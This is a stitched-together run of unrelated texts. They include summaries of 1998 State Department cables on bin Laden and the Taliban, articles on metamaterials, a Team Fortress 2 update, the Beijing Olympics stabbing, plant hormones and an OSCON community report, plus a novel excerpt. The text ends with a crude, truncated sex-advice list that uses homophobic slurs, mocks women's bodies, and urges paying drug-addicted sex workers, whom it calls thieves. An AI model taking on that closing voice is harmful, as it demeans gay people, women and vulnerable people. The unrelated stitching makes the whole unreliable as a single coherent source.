Demonstrated U.S. resolve , dedication to dealing with terrorism as a matter of national security , and the reach of U.S. military power
Provides incentives for nations to cooperate in U.S. counterterrorism activities , if for no other reason but to avoid unilateral action
May deter terrorists and nations from harboring terrorists Document 2
U.S. Embassy ( Islamabad ) , Cable , " TFXX01 : Afghanistan : Reaction to U.S. Strikes Follows Predicable Lines : Taliban Angry , Their Opponents Support U.S. , " August 21 , 1998 , Secret , 8 pp .
Directly following air strikes on al - Qaeda training camps in Afghanistan in retaliation for the attacks on U.S. embassies in Kenya and Tanzania , Taliban Commander Mullah Omar publicly declares the Taliban " will never hand over bin Laden to anyone and ( will ) protect him with our blood at all costs . "
The U.S. Department of State is unclear as to the current whereabouts of bin Laden , but receives information from the then - minor former Afghan politician , Hamid Karzai who tells the Department that bin Laden " is on the move " and that several Taliban officials are very unhappy with Mullah Omar " for bringing the U.S. against Afghanistan . "
Overall the U.S. strikes have not produced an anti-American reaction in Afghanistan , as several sources report that bin Laden 's presence is seen as " more of a burden than a blessing " by many Afghans .

Pakistan remains largely calm in the wake of the potentially politically inflammatory August 20 U.S. air strikes on Afghanistan and Sudan conducted in retaliation for the August 7 Embassy bombings .
A Pakistani newspaper claims Mullah Omar is displeased with Osama bin Laden for threatening to retaliate for the U.S. strikes and for undermining his control of Afghanistan 's international relations .

U.S. Department of State Bureau of Intelligence and Research ( INR ) Intelligence Assessment , " Bin Ladin 's Jihad : Political Context , " August 28 , 1998 , Confidential , 2 pp .
Providing a brief analysis explaining the political context behind bin Laden 's recent terrorist acts , this U.S. Department of State Intelligence Assessment concludes that bin Laden 's extremism has found " fertile ground " in the Arab world .
Recent years have brought increasing " feelings of injustice and victimization [ in the Arab world ] – and growing conviction among Arab elites and masses alike that US policies prop up corrupt regimes ; favor Israel at Arab expense ; and are designed to divide , weaken and exploit the Arab world – are rooted in negative Arab perceptions of specific US policies .
Bin Ladin rides this tide of opinion .
Though few Arabs endorse his terrorism , many share at least some of his political sentiments . "

U.S. Department of State Bureau of Intelligence and Research ( INR ) Intelligence Assessment , " Afghanistan : Taleban External Ambitions , " August 28 , 1998 , Secret , 2 pp .
Despite the Taliban 's lack of material capacity and full ideological vision to promote a large - scale agenda aiming to promote Taliban - style Islamic government across the Muslim world , there have been increasing signs , including statements by Mullah Mohammad Omar , Supreme Leader of the Taliban in response to the U.S. embassy bombings , indicating a broadening of the movement 's goals and scope .
The Taliban are " still country boys , " however under the influence of Osama bin Laden may be expanding their sphere of influence beyond Afghanistan .
The Taliban 's increasing influence is already being felt in Taliban - like movements in Pakistan , and Iran continually fears Sunni cross - border subversion .

U.S. Embassy ( Islamabad ) , Cable , " Afghanistan : Reported Activities of Extremist Arabs and Pakistanis Since August 20 U.S. Strike on Khost Terrorist Camps , " September 9 , 1998 , Confidential , 8 pp . [ Excised ]
Tracking the Arab and Pakistani nationals expelled from Khost , Afghanistan by U.S. air strikes , the U.S. Department of State reports Osama bin Laden has been keeping a very low profile , but is probably in Kandahar , Afghanistan , the heart of Taliban - controlled territory , while many of his followers are moving to Kabul .
When in Kandahar bin Laden has been know to stay directly at Mullah Omar 's residence , and is thought to have been ordered to stay close to Omar , " who can more easily keep a watch on him , " in Kandahar City .
The August 20 U.S. bombings reportedly killed approximately 20 Pakistani nationals and 15 Arabs who were in the camps at the time of the bombings .
Document 7
U.S. Embassy ( Islamabad ) , Cable , " Afghanistan : Tensions Reportedly Mount Within Taliban as Ties with Saudi Arabia Deteriorate over Bin Ladin , " September 28 , 1998 , Secret , 8 pp . [ Excised ]
Relations between the Taliban and Saudi Arabia are straining under the bin Laden issue .
Supreme Taliban Commander Mullah Omar reportedly has rejected the Saudi government 's request that they expel bin Laden to Saudi Arabia , and furthermore criticized the government for allowing U.S. troops in the kingdom .
In response to Omar 's comments that the presence of U.S. troops rendered the Saudi government " illegitimate , " Saudi officials are downgrading diplomatic ties , recalling its charge d'affaires in Kabul and expelling Taliban diplomats in Riyadh .
The document concludes with the following thoughts from U.S. Ambassador to Pakistan William Milam , " If Pakistan - the Taliban 's closest international supporter - throws in its weight behind Saudi Arabia on the bin Laden issue , the pressure on the Taliban may become unbearable .
As of this time , Pakistan has not yet made its position clear . "
Document 8
U.S. Embassy ( Islamabad ) , Cable , " Usama bin Ladin : Coordinating Our Efforts and Sharpening Our Message on Bin Ladin " October 19 , 1998 , Secret , 8 pp . [ Excised ]
The Department of State is recommending the U.S. work closely with the Saudis and sharpen its message to Pakistan and the Taliban regarding the expulsion of Osama bin Laden from Afghanistan .
Saudi Arabia remains " the cornerstone of U.S. efforts to bring bin Ladin to justice , " as the U.S. feels the Taliban would consider handing over bin Laden to the Saudis , but " there appears no chance they will give him up to us . "
The U.S. hopes the Saudi government will have more success pressuring Pakistan and the Taliban to listen to U.S. demands .
" The Saudis can also prove useful in upping the pressure on the Taliban by undertaking efforts to cut off their access to the Gulf states , most importantly with the UAE , which is the Taliban 's major entrepot for trade and smuggling . "
Pakistan 's lack of support for U.S. efforts to get bin Laden " must change . "
Ultimately Mullah Omar " appears to be strongly committed to bin Ladin .
It is questionable whether U.S. or Saudi efforts can influence Omar 's decisions .
Maybe Pakistan can , but even that is not known with any certainty . "

U.S. Embassy ( Islamabad ) , Cable , " Afghanistan : Taliban Leader Mullah Omar : Intimations of Radical Pan-Islamic Thinking ? "
October 22 , 1998 , Secret , 8 pp. [ Excised ]
Following the August 1998 Embassy bombings the U.S. Department of State questions its previous assumption that Mullah Omar , the Supreme Commander of the Taliban has only Afghan nationalist political goals .
Omar 's recent statements and activities indicate the leader is developing increasing sympathy for pan-Islamic movements , such as al - Qaeda .
Although speculative , the Department indicates this may be the influence of Osama bin Laden on Mullah Omar .
A Department source reports that bin Laden and Omar frequently eat together with their advisors and that Omar , who is " very poorly educated and unsure of foreign affairs " may be easily influenced by bin Laden 's perspective .
The potential ramifications for these new radical sympathies " are grim .
First and foremost , it could mean that the Taliban would under no conditions expel bin Ladin because they see his cause as theirs . "

Assistant Secretary Karl F. Inderfurth to Secretary of State Madeleine Albright , " Your Meeting in Usama bin Laden , " November 24 , 1998 , Briefing Memorandum , Secret , 3 pp. [ Excised ]
Three months following the U.S. retaliatory strikes on al - Qaeda training camps in Afghanistan , the Assistant Secretary outlines key points on Osama bin Laden in an effort to discuss " how we can persuade the Taliban to expel Usama bin Laden from Afghanistan to a country where he can be brought to justice or otherwise end or limit the threat he poses to U.S. interests . "
According to the Assistant Secretary the U.S. holds the Taliban responsible for bin Laden 's activities , however efforts " to get UBL expelled have been frustrated , we believe , by his ties to Taliban leader Mullah Omar . "
Bin Laden is a threat to U.S. interests and people , the U.S. " can not allow this to continue . "

Assistant Secretary Karl F. Inderfurth to Secretary of State Madeleine Albright , " Your Meeting in Usama bin Laden , " November 24 , 1998 , Talking Points , Secret / NODIS , 2 pp. [ Excised ]
Diplomatic negotiations with the Taliban and with Pakistan regarding the extradition of Osama bin Laden have been unsuccessful and bin Laden 's network continues to operate and threaten " American lives . "
An upcoming December meeting with Pakistani Prime Minister Nawaz Sharif may provide the Secretary with " an opportunity to get this message across at the highest level in direct terms . "
Months after the Embassy bombings bin Laden remains active and under Taliban protection .
" Time for a diplomatic solution may be running out .
Taliban brush - off of our indictment and other evidence may indicate movement from tolerance of UBL 's presence to more active support . "
Document 11
U.S. Department of State Cable , " Osama bin Laden : Taliban Spokesman Seeks New Proposal for Resolving bin Laden Problem " November 28 , 1998 , Secret , 10 pp . [ Excised ]
According to their senior spokesperson , the Taliban currently understand " that the U.S. in particular wanted bin Laden expelled from Afghanistan at all costs , " and that " if they chose to back terrorism , they could expect to be the recipient of terrorism in response . "
The U.N. , U.S. , Saudi Arabia and Pakistan are all applying great pressure to secure the expulsion of bin Laden , but " Kandahar [ Mullah Omar ] was still trying to find a proper way to resolve the issue . "
The East Africa bombings have brought the " issue of the presence of Osama bin Laden on Afghan soil to the forefront " of U.S. security policy and discussions on human rights and narcotics should be " set aside " in order to focus all U.S. - Taliban relations on the goal of resolving the bin Laden issue .
The August 20 U.S. bombings in retaliation for embassy attacks continue to be a source of distress for the Taliban .
" If Kandahar could have retaliated with similar strikes against Washington , it would have .
But it did not want anymore strikes against anyone . "
According to the Taliban , despite giving the Saudis , " an authentic proposal for resolving the bin Laden issue … that would have enabled the Taliban to expel bin Laden in a way that avoided the internal problems that the Taliban leadership feared …
Saudi " pride " stood in the way . "
He also offers that one solution could be " for the U.S. to kill him or arrange for bin Laden to be assassinated . "
Although he ultimately requests that this not be done , he adds that there would be nothing the Taliban could do to prevent it .

In response to Taliban intransigence on the issue of surrendering Osama bin Laden , the Saudi government is being more restrictive on Afghan travel to the holy sites and have reportedly prohibited Afghanistan 's national airline , Ariana from flying between Kabul or Kandahar and Jeddah .
Priding themselves on the piety of their regime , the Taliban will suffer " a great embarrassment , " is their list of individuals approved " for the Haj is not accepted by the SAG [ Saudi government ] . "

The news has broken : we are all going to be able to purchase cloaks of invisibility in a few years .
Or perhaps not .
Some recent research from Berkeley is a big step and will , no doubt , find many applications , but invisibility is not among them .
We take a look at what the researchers achieved and use the Ars meta- crystal ball™ to predict where this will end up being employed .
Over the past few years , there has been a lot of theoretical and experimental work on a class of structures called meta-materials .
A meta-material is used to get around the limitations of natural materials by structuring them in special ways .
This can best be described using quartz as an example .
A single quartz crystal is pretty much transparent to visible light ; a few percent of the light is reflected from the crystal surface , but otherwise it all goes through .
However , if the wavelength is much shorter ( on the order of the spacing between molecules ) , then the crystal is still transparent , but light is scattered into a pattern .
Similarly , if we take a handful of quartz crystals , all the little reflections from the many surfaces scatter even visible light in every direction , resulting in white sand that is no longer possible to see through .
If the quartz crystals were all the same size and shape and arranged in an orderly fashion , however , it would be possible to use them to guide visible light down specific paths as well .
Quartz demonstrates how order and scale matter in how light propagates through a material .
Meta-materials take advantage of this by deliberately engineering materials to have order on scales comparable to the wavelength of light that they want to influence .
This can be done by alternating layers of materials ( as in antireflection coatings ) , by crafting arrays of holes in an otherwise solid material , or by building crystal - like structures composed of small spheres .
In certain circumstances , a meta- material can exhibit a negative refractive index ( in nature , the refractive index is always positive ) , which causes light to bend in unexpected directions .
This has proven to be difficult to achieve at visible wavelengths due to a number of challenges .
A negative refractive index has to have the appropriate scale ( ~30 nm features ) , which is difficult , but not impossible .
However , the electric field phase of the light also needs to be controlled .
To do that , the material must respond to the light 's electric field with a large opposing field that can slows the light 's advance .
In effect , this requires metallic structures that allow the electrons to resonate with the light field , allowing a large opposing field to build up .
Making a single layer of these structures has been done before , but it 's really hard to define the bulk properties of a meta - material when it 's only a single layer thick .
That is what makes the new research so important .
For the first time , researchers have managed to make a negative index meta- material * that is more than a single layer thick .
This allowed them to directly measure its bulk properties and confirm some of the predictions for these materials .
Nature , J.Valentine et al
To construct their negative index material , the researchers grew alternating layers of silver and magnesium fluoride .
This provides the bulk periodicity required , but it does n't provide a resonant structure that will slow the light .
To obtain that , the researchers drilled holes through the structure , creating a series of silver rings .
Each ring acts like an electrical inductor , retarding the phase of the light 's electric field locally .
The inductors in adjacent layers all couple together , creating one giant inductor .
This has the effect of reducing the retardation per inductor , but increasing the range of light colors that the rings will retard .
The meta-material used in this demonstration had 21 layers ( ten of magnesium fluoride and 11 of silver ) with 484 holes drilled through it .
The holes are about 500nm in diameter , and the whole structure has a face of just 5 micrometers on a side .
One face was angled so that the material acted like a prism .
The researchers ' measurements showed that the prism did indeed have a negative refractive index over about one - third of the near - infrared spectrum ( 1.45 to 1.8 micrometers , to be precise ) .
Although this is quite small scale , it is a very important achievement .
Let 's deal with what it is n't first .
It will not act as a cloaking material because of absorption .
There is a lot of silver in it , and silver absorbs and reflects radiation quite efficiently , meaning that not much light makes it through the material — the sample described in Nature , which was less than one micrometer thick , absorbed 35 percent of the incident radiation .
Under ideal fabrication conditions , this might be reduced to as little as six percent per micrometer .
Nevertheless , when you consider that a windowpane reflects about four percent of the incident radiation , you can see why even six percent is too high to render anything invisible .
If anything , it will be easy to spot , as humans pick out reflections and flashes , meaning that this would probably draw more attention than good camouflage .
So , if this is n't a material for making you invisible what is it good for ?
It 's the basic material we need for beating the diffraction limit .
Negative index materials are not subject to the diffraction limit , meaning that light can be focused to smaller volumes .
This implies that we would be able to illuminate cellular machinery at the level of individual molecules or perhaps even individual atoms .
It would even be possible to use direct chemical imaging , instead of relying on fluorescent labels .
This one application , which may well be attainable with the technology the authors used in their demonstration , should be enough for anyone to get excited about .
* Negative index materials for microwave radiation have already been demonstrated .

When ’s the Pyro update ?
When ’s the Pyro update ?
When ’s the Pyro update ?
Okay , okay , we ’ll tell you .
It ’s Thursday ! ( 19th ) .
When ’s Meet The Sniper released ?
When ’s Meet The Sniper released ?
When ’s Meet The Sniper released ?
TUESDAY !
( At 11 am PDT /7 pm GMT , to be specific ) .
This will lead into another of Valve ’s free Team Fortress 2 weekends , so even the most unsure can check out the Pyro ’s three unlockable weapons and 35 new achievements ( if they play fast enough ) .
Also in the update are two user - created TF2 maps , which Valve say is to , “ highlight the great work being done in the community and distribute those works to all TF2 players . ”
TF2 goes free at 11 am PDT ( 7 pm GMT ) on Friday , and will stay that way until you run out of weekend .
This should give everyone , even the cheapskates and paupers , a chance to find out what the other non-unlockable chances to the Pyro will be .
Speculate below .
Meanwhile , I can promise Meet The Sniper is worth looking forward to , even if you were a weensy bit disappointed by the last two ( although being disappointed by Meet The Scout ’s Boinking makes you very stupid ) .
It ’s the best of the lot , with a peculiarly subtle depth of backstory , and some of the biggest laughs .

Once upon a time two or three weeks ago , a rather stubborn and determined middle - aged man decided to record for posterity , exactly as it happened , word by word and step by step , the story of another man for indeed what is great in man is that he is a bridge and not a goal , a somewhat paranoiac fellow unmarried , unattached , and quite irresponsible , who had decided to lock himself in a room a furnished room with a private bath , cooking facilities , a bed , a table , and at least one chair , in New York City , for a year 365 days to be precise , to write the story of another person — a shy young man about of 19 years old — who , after the war the Second World War , had come to America the land of opportunities from France under the sponsorship of his uncle — a journalist , fluent in five languages — who himself had come to America from Europe Poland it seems , though this was not clearly established sometime during the war after a series of rather gruesome adventures , and who , at the end of the war , wrote to the father his cousin by marriage of the young man whom he considered as a nephew , curious to know if he the father and his family had survived the German occupation , and indeed was deeply saddened to learn , in a letter from the young man — a long and touching letter written in English , not by the young man , however , who did not know a damn word of English , but by a good friend of his who had studied English in school — that his parents both his father and mother and his two sisters one older and the other younger than he had been deported they were Jewish to a German concentration camp Auschwitz probably and never returned , no doubt having been exterminated deliberately X * X * X * X , and that , therefore , the young man who was now an orphan , a displaced person , who , during the war , had managed to escape deportation by working very hard on a farm in Southern France , would be happy and grateful to be given the opportunity to come to America that great country he had heard so much about and yet knew so little about to start a new life , possibly go to school , learn a trade , and become a good , loyal citizen .

Tragedy at Beijing Games : U.S. Coach 's Family Member Murdered
Family members of a U.S. Olympic indoor volleyball coach were attacked in Beijing on Saturday by a knife wielding man who killed one American man , injured an American woman as well as their female tour guide .
The 47 year old lone attacker from eastern Hangzhou , , then hurled himself from the second story of the 13th Century Drum Tower to his death .
Todd Bachman of Lakeville , Minnesota was killed .
His wife Barbara Bachman was critically injured .
They are the parents of Elisabeth ' Wiz ' Bachman who played on the US Olympic women 's volleyball team in 2004 and was with them at the time of the attack .
She is married to the head men's U.S. Olympic volleyball team , Hugh McCutcheon - the son - in - law of the murdered man .
Todd Bachman was Chairman and CEO of Bachman Inc. , a huge flower enterprise based in Minneapolis .
See photos below .
Check out additional details and photos here .
The Bachman's , who were visiting a tourist attraction , were not dressed in team colors or in such as way as to identify themselves as Americans .
The two injured women are being treated at Peking Union Medical College Hospital .
Barbara Bachman underwent emergency surgery and remains in critical condition .
International Olympic Committee spokewoman Emmanuelle Moreau was in contact with the Beijing organizers to get more details and determine whether the U.S. Volleyball team needs additional security .
Darryl Siebel , another committee member said of the volleyball team : " they are deeply saddened and shocked . "
U.S. Embassy spokesman Richard Buangan indicated that they assisted in contacting next of kin and are continuing to gather details of the events that unfolded a few hours ago :
" Our priority in this hour is to attend to the needs of family members , the U.S. Olympic men's indoor volleyball team and staff , and the entire U.S. Olympic delegation . "
President , who was in Beijing for the opening ceremonies was notified of the incident and expressed his condolences to the volleyball team and family members of those attacked .
The volleyball team was notified shortly after the attack occurred , and they stayed in the athlete 's village while their security needs were being further assessed .
The men's first match is Sunday .

Discovery to stop plants branching out
A hormone that can literally stop trees branching out has been discovered by an international research team , who say the find could improve productivity of crops around the world .
The research , published in the latest edition of Nature is the result of a collaboration between the University of Queensland ( UQ ) , INRA Versailles and the University of Toulouse .
Co-author Associate Professor Christine Beveridge , at UQ's School of Integrative Biology , says the newly discovered hormone , strigolactone , is a four - ring molecule thought to be derived from carotenoids , the pigments that make carrots orange .
The team has shown strigolactones regulate shoot branching in plants and can be used to control the number of new branches on a plant .
By adding the compound directly to the buds or by supplying it in a solution into the stem of the plant , the number of branches can be altered , she says .
Significant implications
Beveridge says the discovery has significant implications for industries such as forestry and crop farming .
In forestry a lot of time is spent pruning young branches from trees , she says .
" [ This is ] so they get more energy going into the trunk and less into unwanted branches , " Beveridge says .
" In agriculture you might be able to avoid pruning by spraying the crop with this compound or using this compound to discover a more active one that could be applied to that species . "
Beveridge says until now scientists have known of fewer than 10 hormones that control a plant 's appearance .
" It 's probably the case that we 're just starting to chip away at these sort of signalling molecules , " she says .
" Finding another one is important to [ understanding ] how to find them and what they do and how they all interact , " she says .
Helps in water absorption
Strigolactones also play a role in a plant 's ability to absorb water and nutrients , as they promote the beneficial symbiosis with mycorrhizal fungi , which improves nutrient uptake .
" Nearly 80 % of plants that you dig up have got this relationship down in their roots with these fungi and that enhances their ability to take up nutrients , " she says .
" In Australia that is important because we have really bad soil and the plants have to work hard to get water or nutrients out of the soil .
" This discovery is providing the biosynthetic genes for the compound that 's needed to enhance the nutrient water uptake . "
The research could also help with the management of parasitic weeds that devastate staple food crops in parts of Africa and Asia .
Having discovered genes involved in the biosynthesis of strigolactones , scientists can now start modifying crops to make them resistant to parasitic weeds , Beveridge says
Jack Hammond likes to talk about his passion for golf A man who is afraid his father could be lonely has advertised for a drinking companion for him - at £ 7 an hour - and there is no shortage of likely helpers .
Jack Hammond , 88 , of Cadnam , Hampshire , will now meet candidates who answered the 25 p advertisement placed in a local post office by his son Michael .
Mr Hammond used to drink with a neighbour in Barton - on - Sea but is now in a nursing home near his son Michael .
Michael Hammond said he had been " absolutely staggered " by the response .
' Best job '
" When you put an advertisement in a post office for 25 p you do n't expect anything to come of it , so the response has been amazing , " he said .
" But there must be hundreds and hundreds of people in the same position needing some company .
" Dad will be going out with some of the candidates next week but we are going to do it properly , as he is vulnerable . "
We are going to do it properly , as he is vulnerable
Michael Hammond , son Mr Hammond added : " It 's a bit difficult at this age to go out to a pub on his own .
He is hoping to find a gentleman who is not too bombastic and enjoys a nice pint .
" Three of the responses came from the shop advertisement and four from the publicity but we are hoping for more . "
Mr Hammond said the ideal candidate would be a man who can talk about his father 's career in engineering , or his father 's passion for golf .
He said women would be out of the question as Mr Hammond senior would feel uncomfortable going to a pub with a woman he did not know .
" It 's got to be the best job in the world , " he added .

What are these ?
The open - source community is no longer the sole province of technology geeks .
The mood is shifting .
As the mistress of ceremonies at OSCON ( the Open Source Convention ) commented : instead of open source trying to figure out its place in the enterprise , today the enterprise is seeking its place in open source .
And that , among other trends , is causing changes in the community .
Which is not to say that open source is n't still remarkably geeky and willing to celebrate that personality attribute .
SourceForge did offer free tattoos to the first 10 people willing to sport an open - source themed design , an offer that we 're unlikely to see at a Gartner conference .
Nor can I imagine most IT conferences offering session titles like Damian Conway 's " Temporally Quaquaversal Virtual Nanomachine Programming in Multiple Topologically Connected Quantum - Relativistic Parallel Timespaces ... Made Easy ! "
And I saw plenty of purple hair and outfits that would make my mother breathe softly , " Oh , my . "
Yet , several OSCON sessions and one - on - one conversations addressed the community 's self - conscious awareness of who and what it is , and how it might get better , bigger and more helpful to its members .
That was marvelous , and not just because a common theme was people working together in order to better work together .
The open - source community has suffered from flame wars and ( in a day - to - day way ) political infighting , of the " My distro / project / framework can beat up your distro / project / framework " variety .
This is n't unusual for communities dedicated to " alternate " solutions , whether it was IBM 's OS / 2 or Macintosh .
In battling the " enemy " ( which in all these cases has been Microsoft ) and with all the variations on the alternative certain that they see as the correct path ( because once you start making choices you sometimes get lost in making more choices ) , the community wastes energy that should be used in moving forward .
Since I 've historically always been on the " alternate " side myself , it makes me think of a statement Rick Steves made in passing in Europe 101 : History and Art for the Traveler : that the early German Protestants made no great Art.
Resisting and responding to the Catholic church left them no energy or time for creating awesome edifices .
So I was particularly heartened to see a lot of attention going to streamlining and improving people and community issues .
Individuals and open - source organizations are doing their darndest to ease the friction between wetware modules , and creating platforms that bring related projects together .
Among them are attention to gender issues , training the next generation of programmers and attitude adjustments .
I thought it might be appropriate to share a few verbal snapshots from that learning experience , especially since several are relevant even outside open - source circles .
Mark Shuttleworth Tries to Open the Inner Circle
My conversation with Mark Shuttleworth , founder of the Ubuntu Project , was all about building more viable and inclusive communities .
His attention was particularly on making it easier for someone on the outskirts of a community to become part of the central core .
Shuttleworth scribbled a drawing on the back of the press release for Launchpad 2.0 , a hosting platform intended to bring projects together .
At the core of any project are the " rock stars " who spearhead the effort , we agreed ( a bunch of little circles were drawn in the middle of the page ) , and a group of active participants surround them who are committers or contributors in some way — the people whose names you see again and again in the discussion forums .
But ( here Shuttleworth drew a circle around the clustered dots in the middle of the page , and the spread - out dots near them ) most of the people who use the software are outside that inner circle .
To bring them inside , or to expand the radius of the circle , the circle itself has to be permeable ; it can't be a moat around a castle which others must scale to get inside .
( By this time , the drawing looked like an amoeba with acne on a bad hair day . )
It has to be easy for someone who merely thinks this is something " cool " to get involved and become part of the core team .
It is n't just about getting a single project to attract participants .
Most open - source communities also have to interact and integrate their software with others ( the forks of Linux itself , for example , or a content management system that needs to support an AJAX framework ) .
People working on another project have to find it easy to work with this one .
That 's true on an interpersonal level , obviously , but it 's also true of the code .
A developer should be able to try out a modification with the full version of his or another 's project ; Shuttleworth called this " hackcessibility . "
And , he pointed out , it 's necessary for a healthy ecosystem that encourages people to build on what others have done .
All that is interesting in open - source terms , but step back a moment .
Is it any less true of the IT projects in your own company ?
We call them silos , do n't we ?
The big difference between open - source development and enterprise development is that , as Shuttleworth said , " We attract people to the domain based on interest . "
How many business developers get to work on what they want to ?
And how many businesses are willing to allow their people to fail ?
Due to fear of failure ( and your job being on the line ) , corporations buy innovation .
Instead , the open source community encourages people to try new things by branching from the core project ; if you can deliver something good , we 'll merge it back in .
That 's a different way of creating innovation ( not to mention leadership ) ; is there a way for enterprise IT to adopt any part of this attitude ?
The Roles of Women Working in Open Source
That was n't the only community - centric discussion at OSCON , not by a long shot .
A great session extolling the divas of the open source community was given by Pia Waugh from Waugh Partners , in which women were challenged to become more active and visible .
As Waugh pointed out , some open - source contributors deliberately do not reveal their gender because , well , who wants to deal with all that harrassment ?
However , she added , " Every community has morons .
Sometimes people say certain things ... but that should n't dictate our behavior . "
To promote female hacker visibility , Waugh cited several dozen prominent open - source women , such as those active in kernel hacking , high availability specialities , Joomla and Debian .
A few examples : Dorothy Okello is empowering women in Uganda with open source , especially in the wireless networking arena .
And Amy Jiang is active in showing how free software can work in China , Waugh explained .
More resources , and notes on Waugh 's talk , can be found at GeekFeminism .
Wikia.com .
( Plus , Alex Russell shared his own opinions on the effect of anonymity on women 's open - source particiption which are well worth contemplating . )
In a related talk , during the July 24 keynote address , Danese Cooper , secretary and treasurer of the Open Source Initiative , told the community , " Stop whinging and start doing . "
Whinging , as she defined it , is " to complain in the repetitive incesant way that make parents buy children things in stores that they really did n't want to buy . "
( She also introduced us to the complaints choir [ YouTube ] which may be the first time you 're tempted to sing in Finnish .
The complaints choir , Cooper explained , began when two women got tired of their own kvetching and decided that hmm , maybe they could use that energy in a better way . )
With open source at an inflection point , Cooper said , she urged everyone to " Focus on going forward , not the problem statement . "
She said people need to " recalibrate our language , " by eliminating words with negative charge ; to make a special point of acknowledging those who help , such as insisting on Thank Yous on project websites ( " We are nothing if we are not together , " Cooper said ) ; and to avoid wasting energy on infighting .
Good advice for any community , I think .
Ca n't We All Just Get Along ?
A late afternoon panel session , led by Josh Berkus ( from the PostgreSQL Project ) , Shane Warden ( O' Reilly Media ) , Ben Collins - Sussman ( Google ) , Brian Fitzpatrick ( Google ) and Karl Fogel ( QuestionCopyright.org ) focused on " anti-patterns " in community management .
Their goal was to identify behaviors in open - source ( and , really , in any ) online communities that , the panel promised , are " guaranteed to shrink , disrupt , divide , or even destroy the community around your open source project . "
One example , labeled , " We do n't need no steenking documentation ! " had several suggestions of what not - to - have , including installation docs , user docs , contributor docs ( more general things you can do for the project other than coding ) , wikis with peer - to - peer documentation , high level docs that explain how the source code is organized and designed , and code markup in the source that explains everything at detail level .
An audience member added : make sure your command line utilities do n't respond to -h ; make sure documentation is n't available from the command line so they have to go to the Web ; make sure the documentation does n't say which version of the product it references .
It 's worth mentioning , as an aside , that a frequent contributor to the open - source Plone content management system , JoAnna Springsteen , wrote Finding the Right Technical Writer for us .
In case you care about documentation quality yourself , and I earnestly hope you do .
Other community - killers panelists identified include screwing around with licenses too much ; feeding the trolls ; and using technology instead of people skills ( to which I referred in my earlier post about the open source community needing to learn and develop management skills ) .
In the latter instance , the panelist said , community members try to solve social problems with technological solutions , such as setting up complex authorization controls , to force " which people can commit code when . "
Path - based access control is a mistake , he said , and a waste of time and energy .
" It creates an atmosphere of distrust rather than trust , " he added .
I 'm afraid that sounds as though the conversations were all cautionary , if not a little on the whinging side itself .
Not so .
There were all sorts of discussions about how to improve matters , such as Nathan Torkington 's keynote session on teaching kids to program .
Community leaders , including Joe " Zonker " Brockmeier from OpenSUSE , Ross Turk from SourceForge.net , Jono Bacon from Ubuntu and Jeremy Hogan of Hyperic ( previously community manager for Red Hat ) spent a whole session discussing their efforts to get a user to become a contributor in some way , while noting how conditions have changed .
" Five years ago , " said Bacon , " You had to be a programmer [ to be involved in an open - source community ] .
Or you could do doc .
But you needed to learn latex for [ documentation ] , which is programming . "
Today , the software itself encourages users to contribute at least in a minor way , such as Firefox 's " just click here " option to report a bug .
One lesson learned ?
Bacon said they learned ( the hard way ) not to try to convert a user community into a developer community .
It 's tempting , when you a have a million users of your open - source software , to imagine the effect of getting " just 1 percent " of them to write code .
But it does n't work .
" You 're trying to convince a cat to bark , " he said .
Instead , community leaders need to put their energy into converting users to advocates .
Open Web Foundation to Help Standards Grow Up
That growth is n't all about people matters ; technology and standards are part of the growing - up process too .
As David Recordon , Open Platforms Tech Lead at Six Apart and vice - chair at The OpenID Foundation explained during a keynote address , for the Internet to become " the " platform , the conversation has to shift from just open source to data .
" As more services move into the cloud , it 's not just the source code behind it [ that matters ] but the data as well . "
That data needs to be accessible everywhere , which means a lot of APIs ; " The number of APIs necessary to give you a pulsating blue circle around your location is pretty amazing , " he said .
Open APIs for data exchange are no longer just a nice - to - have , he said .
Venture capitalists are asking new companies how they will work with other companies , rather than looking for lock - in .
The online and open - source community has not been idle .
Technical solutions have been designed outside of the formal standards bodies .
But OpenID , OAuth and OpenSocial share some problems , according to Recordon : unclear licensing on the specifications , no " social contract , " and uncertain definitions for " how you play well " on the open Web .
Plenty of folks are working on these issues , he said , including Sam Ruby , Simon Phipps and Danese Cooper .
( Remember that part about making a point to thank individual contributors ? )
Believing that " Open Data Needs Open Specifications " ( you sort of have to say it with Capitals ) , Recordon announced the formation of the Open Web Foundation , so these communities can work together .
Communities , like people , are either busy growing or they are busy dying .
" The real threat to Microsoft , " said Shuttleworth , " is the emergence of business models that energize free software . "
So there you are , sitting in your mom 's basement in front of your computer watching porn and jerking off and wishing you could do it with a real live girl .
Well , cheer up , dorkboy , it 's possible !
I 've done it , so can you .
Here are ten strategies that can actually get you in bed with a member of the opposite sex , whether you 're a male nerd or a female nerd .
1 . Get the fuck out of your house !
Thare ai n't gonna be no hot girl ( or guy if you 're a girl or a queer ) knock on your door saying " will you please fuck me ? "
You 're not going to get laid sending money to a dating site .
Believe me , I 've tried .
Waste of good money and bad time .
2 . Do n't be picky !
Face it , you 're never , ever going to have sex with a supermodel .
Find an ugly chick ( or dork ) who 's likely having as much trouble getting laid as you are .
Go to the library - a nerd of the opposite sex ( or same sex if you 're ghey ) is as likely as you to want to get laid , but not be able to .
My current girlfriend weighs 300 pounds and had n't gotten laid in six months when I met her .
My last girlfriend was flat chested , bow legged , and had no teeth .
There are definite psychical advantages to having a toothless girlfriend , too .
If she 's flat chested , two words : Doggy style .
Since you 're a nerd , never forget to thank science for its advances !
I 'd never be able to get it up for my girlfriend if they had n't invented viagra .
Your doctor will prescribe it or give you a sample pack , just tell him you 're having problems getting an erection .
Just do n't tell him you can't get it up because your girlfriend 's butt - ugly .
A side effect of viagra is it makes you onto a superlover - it turns you into the Energizer Bunny .
You take the pill , she gets the benefits .
3. Crack whores !
For twenty bucks a crack whore will let you do damned near anything you want to her , or will do anything you want her to do to you .
Just do n't let her into your house , as crack whores are all thieves .
Again , I speak from painful experience .
If you 're a girl or a fag you can find male crack whores , although the female crack whores are more honest with themselves about what they are .
Also , use a condom for Chrissake !
A crack whore is almost 100 % certain to give tyou the clap or worse if you stick your naked johnson in her .
4 . A big dick is n't going to do you any good , unless you 're a girl .
Again , I speakfrom expoerience .
A little dick will do you wonders if you 're a fag .
I 'm glad I was n't born a fruit , my schlong is too big to fit a mouth comfortably ( at least one with teeth ) , or any ass smaller than goatse's .
If you 're a girl , settle for a little dick .
Or come see me and my big cock !
5 . Buy an airplane ticket to Nevada or Canada or Germany or Ansterdam .
However , I personally prefer option # 3 , as I like skinny chicks , and I 'm a cheapassed bastard .
If you are a skinny chick , buy an airplane ticket to Illinois and see me !
I wo n't complain about your big nose , flat chest , and missing teeth .
6 . Be in a bar half drunk at quitting time .
